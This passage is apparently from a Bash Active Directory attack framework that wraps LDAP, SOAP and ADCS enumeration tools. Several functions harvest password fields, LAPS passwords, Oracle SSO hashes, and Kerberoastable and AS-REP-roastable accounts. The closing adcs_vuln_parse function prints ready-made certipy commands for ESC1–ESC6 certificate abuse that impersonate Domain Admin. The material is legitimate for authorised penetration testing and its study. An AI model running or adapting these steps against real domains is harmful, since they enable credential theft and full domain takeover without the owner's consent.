            grep -a "dNSHostName:" "${DomainRecon_dir}/windapsearch/windapsearch_servers_${dc_domain}.txt" | sed "s/dNSHostName: //g" | sort -u >"${Servers_dir}/servers_list_windap_${dc_domain}.txt" 2>&1
            grep -a "cn:" "${DomainRecon_dir}/windapsearch/windapsearch_groups_${dc_domain}.txt" | sed "s/cn: //g" | sort -u >"${DomainRecon_dir}/windapsearch/groups_list_windap_${dc_domain}.txt" 2>&1
            grep -iha "pass\|pwd" "${DomainRecon_dir}"/windapsearch/windapsearch_*_"${dc_domain}.txt" | grep -av "badPasswordTime\|badPwdCount\|badPasswordTime\|pwdLastSet\|have their passwords replicated\|RODC Password Replication Group\|msExch" >"${DomainRecon_dir}/windapsearch/windapsearch_pwdfields_${dc_domain}.txt"
            if [ -s "${DomainRecon_dir}/windapsearch/windapsearch_pwdfields_${dc_domain}.txt" ]; then
                echo -e "${GREEN}[+] Printing passwords found in LDAP fields...${NC}"
                /bin/cat "${DomainRecon_dir}/windapsearch/windapsearch_pwdfields_${dc_domain}.txt"
            fi
            parse_users
            parse_servers
        fi
    fi
    echo -e ""
}

ldapwordharv_enum() {
    if ! stat "${LDAPWordlistHarvester}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of LDAPWordlistHarvester${NC}"
    else
        echo -e "${BLUE}[*] Generating wordlist using LDAPWordlistHarvester${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] LDAPWordlistHarvester requires credentials${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--ldaps"; else ldaps_param=""; fi
            if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v"; else verbose_p0dalirius=""; fi
            run_command "${python3} ${LDAPWordlistHarvester} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --kdcHost ${dc_FQDN} --dc-ip ${dc_ip} -o ${DomainRecon_dir}/ldapwordharv_${dc_domain}.txt" 2>&1 | tee -a "${DomainRecon_dir}/ldapwordharv_output_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

rdwatool_enum() {
    if ! stat "${rdwatool}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of rdwatool${NC}"
    else
        echo -e "${BLUE}[*] Enumerating RDWA servers using rdwatool${NC}"
        run_command "${rdwatool} recon -tf ${servers_hostname_list} -k" 2>&1 | tee "${DomainRecon_dir}/rdwatool_output_${dc_domain}.txt"
    fi
    echo -e ""
}

ldapper_enum() {
    if ! stat "${ldapper}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of ldapper${NC}"
    else
        echo -e "${BLUE}[*] Enumeration of LDAP using ldapper${NC}"
        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] ldapper requires credentials and does not support Kerberos authentication${NC}"
        else
            mkdir -p "${DomainRecon_dir}/LDAPPER"
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-n 1"; else ldaps_param="-n 2"; fi
            echo -e "${CYAN}[*] Get all users${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '1' -f json" >"${DomainRecon_dir}/LDAPPER/users_output_${dc_domain}.json"
            if [ -s "${DomainRecon_dir}/LDAPPER/users_output_${dc_domain}.json" ]; then
                /usr/bin/jq -r ".[].samaccountname" "${DomainRecon_dir}/LDAPPER/users_output_${dc_domain}.json" 2>/dev/null > "${Users_dir}/users_list_ldapper_${dc_domain}.txt"
            fi
            echo -e "${CYAN}[*] Get all groups (and their members)${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '2' -f json" >"${DomainRecon_dir}/LDAPPER/groups_output_${dc_domain}.json"
            echo -e "${CYAN}[*] Get all printers${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '3' -f json" >"${DomainRecon_dir}/LDAPPER/printers_output_${dc_domain}.json"
            echo -e "${CYAN}[*] Get all computers${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '4' -f json" >"${DomainRecon_dir}/LDAPPER/computers_output_${dc_domain}.json"
            if [ -s "${DomainRecon_dir}/LDAPPER/computers_output_${dc_domain}.json" ]; then
                /usr/bin/jq -r ".[].dnshostname" "${DomainRecon_dir}/LDAPPER/computers_output_${dc_domain}.json" 2>/dev/null > "${Servers_dir}/servers_list_ldapper_${dc_domain}.txt"
            fi
            echo -e "${CYAN}[*] Get Domain/Enterprise Administrators${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '5' -f json" >"${DomainRecon_dir}/LDAPPER/admins_output_${dc_domain}.json"
            echo -e "${CYAN}[*] Get Domain Trusts${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '6' -f json" >"${DomainRecon_dir}/LDAPPER/trusts_output_${dc_domain}.json"
            echo -e "${CYAN}[*] Search for Unconstrained SPN Delegations (Potential Priv-Esc)${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '7' -f json" >"${DomainRecon_dir}/LDAPPER/unconstrained_output_${dc_domain}.json"
            echo -e "${CYAN}[*] Search for Accounts where PreAuth is not required. (ASREPROAST)${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '8' -f json" >"${DomainRecon_dir}/LDAPPER/asrep_output_${dc_domain}.json"
            echo -e "${CYAN}[*] Search for User SPNs (KERBEROAST)${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '9' -f json" >"${DomainRecon_dir}/LDAPPER/kerberoastable_output_${dc_domain}.json"
            echo -e "${CYAN}[*] Show All LAPS LA Passwords (that you can see)${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '10' -f json" >"${DomainRecon_dir}/LDAPPER/ldaps_output_${dc_domain}.json"
            echo -e "${CYAN}[*] Search for common plaintext password attributes (UserPassword, UnixUserPassword, unicodePwd, and msSFU30Password)${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '11' -f json" >"${DomainRecon_dir}/LDAPPER/passwords_output_${dc_domain}.json"
            echo -e "${CYAN}[*] Show All Quest Two-Factor Seeds (if you have access)${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '12' -f json" >"${DomainRecon_dir}/LDAPPER/quest_output_${dc_domain}.json"
            echo -e "${CYAN}[*] Oracle 'orclCommonAttribute'SSO password hash${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '13' -f json" >"${DomainRecon_dir}/LDAPPER/oracle_sso_common_output_${dc_domain}.json"
            echo -e "${CYAN}[*] Oracle 'userPassword' SSO password hash${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '14' -f json" >"${DomainRecon_dir}/LDAPPER/oracle_sso_pass_output_${dc_domain}.json"
            echo -e "${CYAN}[*] Get SCCM Servers${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '15' -f json" >"${DomainRecon_dir}/LDAPPER/sccm_output_${dc_domain}.json"
        fi
    fi
    echo -e ""
}

adalanche_enum() {
    if ! stat "${adalanche}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of Adalanche${NC}"
    else
        mkdir -p "${DomainRecon_dir}/Adalanche"
        echo -e "${BLUE}[*] Adalanche Enumeration${NC}"
        if [ -n "$(ls -A "${DomainRecon_dir}/Adalanche/data" 2>/dev/null )" ] && [ "${noexec_bool}" == "false" ]; then
            echo -e "${YELLOW}[i] Adalanche results found, would you like to run the scan again? (y/N)${NC}"
            ada_ans="N"
            read -rp ">> " ada_ans </dev/tty
            if [[ ! "${ada_ans}" == "y" ]] && [[ ! "${ada_ans}" == "Y" ]]; then
                return 1
            fi
        fi
        if [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] Adalanche does not support Kerberos authentication using AES Key${NC}"
        else
            current_dir=$(pwd)
            cd "${DomainRecon_dir}/Adalanche" || exit
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--tlsmode tls --ignorecert"; else ldaps_param="--tlsmode NoTLS --port 389"; fi
            run_command "${adalanche} ${adalanche_verbose} collect activedirectory ${argument_adalanche} --domain ${dc_domain} --server ${dc_ip} ${ldaps_bool}" | tee "${DomainRecon_dir}/Adalanche/adalanche_output_${dc_domain}.txt"
            cd "${current_dir}" || exit
        fi
    fi
    echo -e ""
}

ldap_console() {
    if ! stat "${ldapconsole}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of ldapconsole${NC}"
    else
        echo -e "${BLUE}[*] Launching ldapconsole${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] ldapconsole requires credentials ${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
            if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="--debug"; else verbose_p0dalirius=""; fi
            run_command "${python3} ${ldapconsole} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip} --kdcHost ${dc_FQDN}" 2>&1 | tee -a "${DomainRecon_dir}/ldapconsole_output_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

ldap_monitor() {
    if ! stat "${pyLDAPmonitor}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of pyLDAPmonitor${NC}"
    else
        echo -e "${BLUE}[*] Launching pyLDAPmonitor${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] pyLDAPmonitor requires credentials ${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
            if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="--debug"; else verbose_p0dalirius=""; fi
            run_command "${python3} ${pyLDAPmonitor} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip} --kdcHost ${dc_FQDN}" 2>&1
        fi
    fi
    echo -e ""
}

aced_console() {
    if ! stat "${aced}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of aced${NC}"
    else
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] aced requires credentials${NC}"
        else
            echo -e "${BLUE}[*] Launching aced${NC}"
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
            run_command "${python3} ${aced} ${argument_aced}\\@${dc_FQDN} ${ldaps_param} -dc-ip ${dc_ip}" 2>&1 | tee -a "${DomainRecon_dir}/aced_output_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

godap_console() {
    if ! stat "${godap}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of godap${NC}"
    else
        if [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] godap does not support Kerberos authentication using AES Key${NC}"
        else
            echo -e "${BLUE}[*] Launching godap${NC}"
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-S -I"; else ldaps_param=""; fi
            run_command "${godap} ${target} ${argument_godap} --port ${ldap_port} --kdc ${dc_FQDN} ${ldaps_param}" 2>&1 | tee -a "${DomainRecon_dir}/godap_output_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

ldapper_console() {
    if ! stat "${ldapper}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of ldapper${NC}"
    else
        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] ldapper requires credentials and does not support Kerberos authentication${NC}"
        else
            mkdir -p "${DomainRecon_dir}/LDAPPER"
            echo -e "${BLUE}[*] Running ldapper with custom LDAP search string${NC}"
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-n 1"; else ldaps_param="-n 2"; fi
            echo -e "${CYAN}[*] Please choose an option or provide a custom LDAP search string ${NC}"
            echo -e "1.1) Get specific user (You will be prompted for the username)"
            echo -e "2.1) Get specific group (You will be prompted for the group name)"
            echo -e "4.1) Get specific computer (You will be prompted for the computer name)"
            echo -e "9.1) Search for specific User SPN (You will be prompted for the User Principle Name)"
            echo -e "10.1) Search for specific Workstation LAPS Password (You will be prompted for the Workstation Name)"
            echo -e "*) Run custom Query (e.g. (&(objectcategory=user)(serviceprincipalname=*))"
            echo -e "back) Go back"

            read -rp "> " custom_option </dev/tty
            if [[ ! ${custom_option} == "back" ]]; then
                run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -s ${custom_option}" | tee -a "${DomainRecon_dir}/LDAPPER/ldapper_console_output_${dc_domain}.txt"
            else
                ad_menu
            fi
            ldapper_console
        fi
    fi
    echo -e ""
}

adcheck_enum() {
    if ! stat "${ADCheck}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of ADCheck${NC}"
    else
        mkdir -p "${DomainRecon_dir}/ADCheck"
        echo -e "${BLUE}[*] ADCheck Enumeration${NC}"
        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] ADCheck requires credentials and does not support Kerberos authentication${NC}"
        else
            current_dir=$(pwd)
            cd "${DomainRecon_dir}/ADCheck" || exit
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            run_command "${ADCheck} ${argument_adcheck} ${ldaps_param} --dc-ip ${dc_ip}" | tee "${DomainRecon_dir}/ADCheck/ADCheck_output_${dc_domain}.txt"
            cd "${current_dir}" || exit
            /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/ADCheck/*_users.json 2>/dev/null > "${Users_dir}/users_list_adcheck_${dc_domain}.txt"
            /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/ADCheck/*_computers.json 2>/dev/null > "${Servers_dir}/servers_list_adcheck_${dc_domain}.txt"
            /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${DomainRecon_dir}"/ADCheck/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u > "${Servers_dir}/sql_list_adcheck_${dc_domain}.txt"
            parse_users
            parse_servers
        fi
    fi
    echo -e ""
}

soapy_enum() {
    if ! stat "${soapy}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of soapy${NC}"
    else
        mkdir -p "${DomainRecon_dir}/soapy"
        echo -e "${BLUE}[*] soapy Enumeration${NC}"
        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] soapy requires credentials and does not support Kerberos authentication${NC}"
        else
            cd "${DomainRecon_dir}/soapy" || exit
            run_command "${soapy} --ts --users ${argument_soapy}@${dc_ip}" | tee "${DomainRecon_dir}/soapy/soapy_users_output_${dc_domain}.txt"
            run_command "${soapy} --ts --computers ${argument_soapy}@${dc_ip}" | tee "${DomainRecon_dir}/soapy/soapy_computers_output_${dc_domain}.txt"
            run_command "${soapy} --ts --groups ${argument_soapy}@${dc_ip}" | tee "${DomainRecon_dir}/soapy/soapy_groups_output_${dc_domain}.txt"
            run_command "${soapy} --ts --constrained ${argument_soapy}@${dc_ip}" | tee "${DomainRecon_dir}/soapy/soapy_constrained_output_${dc_domain}.txt"
            run_command "${soapy} --ts --unconstrained ${argument_soapy}@${dc_ip}" | tee "${DomainRecon_dir}/soapy/soapy_unconstrained_output_${dc_domain}.txt"
            run_command "${soapy} --ts --spns ${argument_soapy}@${dc_ip}" | tee "${DomainRecon_dir}/soapy/soapy_spns_output_${dc_domain}.txt"
            run_command "${soapy} --ts --asreproastable ${argument_soapy}@${dc_ip}" | tee "${DomainRecon_dir}/soapy/soapy_asreproastable_output_${dc_domain}.txt"
            run_command "${soapy} --ts --admins ${argument_soapy}@${dc_ip}" | tee "${DomainRecon_dir}/soapy/soapy_admins_output_${dc_domain}.txt"
            run_command "${soapy} --ts --rbcds ${argument_soapy}@${dc_ip}" | tee "${DomainRecon_dir}/soapy/soapy_rbcds_output_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

soaphd_enum() {
    if ! stat "${soaphound}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of Soaphound${NC}"
    else
        mkdir -p "${DomainRecon_dir}/Soaphound_${user_var}"
        echo -e "${BLUE}[*] Soaphound Enumeration using all collection methods (Noisy!)${NC}"
        if [ -n "$(find "${DomainRecon_dir}/Soaphound_${user_var}/" -type f -name '*.json' -print -quit)" ] && [ "${noexec_bool}" == "false" ]; then
            echo -e "${YELLOW}[i] Soaphound results found, would you like to run the scan again? (y/N)${NC}"
            sph_ans="N"
            read -rp ">> " sph_ans </dev/tty
            if [[ ! "${sph_ans}" == "y" ]] && [[ ! "${sph_ans}" == "Y" ]]; then
                return 1
            fi
        fi
        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] Soaphound requires credentials and does not support Kerberos authentication${NC}"
        else
            run_command "${soaphound} -d ${dc_domain} ${argument_soaphd} -dc ${dc_FQDN} --output-dir ${DomainRecon_dir}/Soaphound_${user_var}" | tee "${DomainRecon_dir}/Soaphound_${user_var}/soaphound_output_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

soaphd_enum_dconly() {
    if ! stat "${soaphound}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of Soaphound${NC}"
    else
        mkdir -p "${DomainRecon_dir}/Soaphound_${user_var}"
        echo -e "${BLUE}[*] Soaphound Enumeration using DCOnly${NC}"
        if [ -n "$(find "${DomainRecon_dir}/Soaphound_${user_var}/" -type f -name '*.json' -print -quit)" ] && [ "${noexec_bool}" == "false" ]; then
            echo -e "${YELLOW}[i] Soaphound results found, would you like to run the scan again? (y/N)${NC}"
            sph_ans="N"
            read -rp ">> " sph_ans </dev/tty
            if [[ ! "${sph_ans}" == "y" ]] && [[ ! "${sph_ans}" == "Y" ]]; then
                return 1
            fi
        fi
        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] Soaphound requires credentials and does not support Kerberos authentication${NC}"
        else
            run_command "${soaphound} -d ${dc_domain} ${argument_soaphd} -c ADWSOnly -dc ${dc_FQDN} --output-dir ${DomainRecon_dir}/Soaphound_${user_var}" | tee "${DomainRecon_dir}/Soaphound_${user_var}/soaphound_output_dconly_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

daclsearch_run () {
    if ! stat "${daclsearch}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of daclsearch${NC}"
    else
        echo -e "${BLUE}[*] daclsearch Enumeration${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] daclsearch requires credentials ${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--ldaps"; else ldaps_param=""; fi
            run_command "${daclsearch} dump ${argument_daclsearch} -d ${dc_domain} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} -j ${DomainRecon_dir}/daclsearch_${dc_domain}.json ${DomainRecon_dir}/daclsearch_${dc_domain}.db" 2>&1 | tee "${DomainRecon_dir}/daclsearch_output_${dc_domain}.txt"
            run_command "${daclsearch} cli ${DomainRecon_dir}/daclsearch_${dc_domain}.db" 2>&1 | tee -a "${DomainRecon_dir}/daclsearch_cli_output_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

###### adcs_enum: ADCS Enumeration
ne_adcs_enum() {
    mkdir -p "${ADCS_dir}"
    if ! stat "${ADCS_dir}/ne_adcs_output_${user_var}.txt" >/dev/null 2>&1 || [ "${noexec_bool}" == "true" ]; then
        echo -e "${BLUE}[*] ADCS Enumeration${NC}"
        run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M adcs --kdcHost ${dc_FQDN} --log ${ADCS_dir}/ne_adcs_output_${user_var}.txt" 2>&1
    else
        echo -e "${YELLOW}[i] ADCS info found, skipping...${NC}"
    fi
    pki_servers=$(grep -o "Found PKI Enrollment Server.*" "${ADCS_dir}/ne_adcs_output_${user_var}.txt" 2>/dev/null | cut -d " " -f 5- | awk '!x[$0]++')
    pki_cas=$(grep -o "Found CN.*" "${ADCS_dir}/ne_adcs_output_${user_var}.txt" 2>/dev/null | cut -d " " -f 3- | sed "s/ /SPACE/g" | awk '!x[$0]++')
    echo -e ""
}

certi_py_enum() {
    if ! stat "${certi_py}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of certi.py${NC}"
    else
        echo -e "${BLUE}[*] certi.py Enumeration${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] certi.py requires credentials${NC}"
        else
            run_command "${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --class ca" 2>&1 | tee "${ADCS_dir}/certi.py_CA_output_${user_var}.txt"
            run_command "${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --class service" 2>&1 | tee "${ADCS_dir}/certi.py_CAServices_output_${user_var}.txt"
            run_command "${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --vuln --enabled" 2>&1 | tee "${ADCS_dir}/certi.py_vulntemplates_output_${user_var}.txt"
        fi
    fi
    echo -e ""
}

certipy_enum() {
    if ! stat "${certipy}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
    else
        echo -e "${BLUE}[*] Certipy Enumeration${NC}"
        if stat "${ADCS_dir}/vuln_${domain}_Certipy.json" >/dev/null 2>&1 && [ "${noexec_bool}" == "false" ]; then
            echo -e "${YELLOW}[i] Certipy results found, would you like to run the scan again? (y/N)${NC}"
            cert_ans="N"
            read -rp ">> " cert_ans </dev/tty
            if [[ ! "${cert_ans}" == "y" ]] && [[ ! "${cert_ans}" == "Y" ]]; then
                return 1
            fi
        fi
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] certipy requires credentials${NC}"
        else
            current_dir=$(pwd)
            cd "${ADCS_dir}" || exit
            if [ "${ldaps_bool}" == true ]; then
                ldaps_param=""
                if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-channel-binding"; fi
            else
                ldaps_param="-ldap-scheme ldap"
                if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-signing"; fi
            fi
            if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
            run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapbindsign_param} -stdout"  | tee "${ADCS_dir}/certipy_output_${user_var}.txt"
            run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapbindsign_param} -vulnerable -json -output vuln_${dc_domain} -stdout -hide-admins" 2>&1 | tee -a "${ADCS_dir}/certipy_vulnerable_output_${user_var}.txt"
            cd "${current_dir}" || exit
        fi
    fi
    echo -e ""
    adcs_vuln_parse | tee "${ADCS_dir}/ADCS_exploitation_steps_${dc_domain}.txt"
}

adcs_vuln_parse() {
    ne_adcs_enum
    if [ "${ldaps_bool}" == true ]; then
        ldaps_param=""
        if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-channel-binding"; fi
    else
        ldaps_param="-ldap-scheme ldap"
        if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-signing"; fi
    fi
    esc1_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC1" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
    if [[ -n $esc1_vuln ]]; then
        echo -e "\n${GREEN}[+] ESC1 vulnerability potentially found! Follow steps below for exploitation:${NC}"
        for vulntemp in $esc1_vuln; do
            echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
            echo -e "${CYAN}1. Request certificate with an arbitrary UPN (Domain Admin or DC or both):${NC}"
            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas//SPACE/ }\" ] -target [ ${pki_servers} ] -template ${vulntemp} -upn [ Domain Admin ]@${dc_domain} -dns ${dc_NETBIOS} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
            echo -e "${CYAN}2. Authenticate using pfx of Domain Admin or DC:${NC}"
            echo -e "${certipy} auth -pfx [ Domain Admin_Domain Controller ].pfx -dc-ip ${dc_ip}"
        done
    fi

    esc2_3_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select ((."[!] Vulnerabilities"."ESC2" or ."[!] Vulnerabilities"."ESC3") and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
    if [[ -n $esc2_3_vuln ]]; then
        echo -e "\n${GREEN}[+] ESC2 or ESC3 vulnerability potentially found! Follow steps below for exploitation:${NC}"
        for vulntemp in $esc2_3_vuln; do
            echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
            echo -e "${CYAN}1. Request a certificate based on the vulnerable template:${NC}"
            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas//SPACE/ }\" ] -target [ ${pki_servers} ] -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
            echo -e "${CYAN}2. Use the Certificate Request Agent certificate to request a certificate on behalf of the Domain Admin:${NC}"
            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas//SPACE/ }\" ] -target [ ${pki_servers} ] -template [ User ] -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\[ Domain Admin ] -pfx '${user}.pfx' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
            echo -e "${CYAN}3. Authenticate using pfx of Domain Admin:${NC}"
            echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
        done
    fi

    esc4_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC4" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
    if [[ -n $esc4_vuln ]]; then
        echo -e "\n${GREEN}[+] ESC4 vulnerability potentially found! Follow steps below for exploitation:${NC}"
        for vulntemp in $esc4_vuln; do
            echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
            echo -e "${CYAN}1. Make the template vulnerable to ESC1:${NC}"
            echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -save-old -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
            echo -e "${CYAN}2. Request certificate with an arbitrary UPN (Domain Admin or DC or both):${NC}"
            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas//SPACE/ }\" ] -target [ ${pki_servers} ] -template ${vulntemp} -upn [ Domain Admin ]@${dc_domain} -dns ${dns_ip} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
            echo -e "${CYAN}3. Restore configuration of vulnerable template:${NC}"
            echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -configuration ${vulntemp}.json ${ldaps_param} ${ldapbindsign_param}"
            echo -e "${CYAN}4. Authenticate using pfx of Domain Admin or DC:${NC}"
            echo -e "${certipy} auth -pfx [ Domain Admin_Domain Controller ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
        done
    fi

    esc6_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC6") | ."CA Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u | sed "s/ /SPACE/g")
    if [[ -n $esc6_vuln ]]; then
        echo -e "\n${GREEN}[+] ESC6 vulnerability potentially found! Follow steps below for exploitation:${NC}"
        for vulnca in $esc6_vuln; do
            echo -e "\n${BLUE}# \"${vulnca//SPACE/ }\" certificate authority${NC}"
            echo -e "${CYAN}1. Request certificate with an arbitrary UPN (Domain Admin or DC or both):${NC}"
            echo -e "${certipy} req ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -target [ ${pki_servers} ] -template [ User ] -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
            echo -e "${CYAN}2. Authenticate using pfx of Domain Admin:${NC}"
            echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
        done
    fi

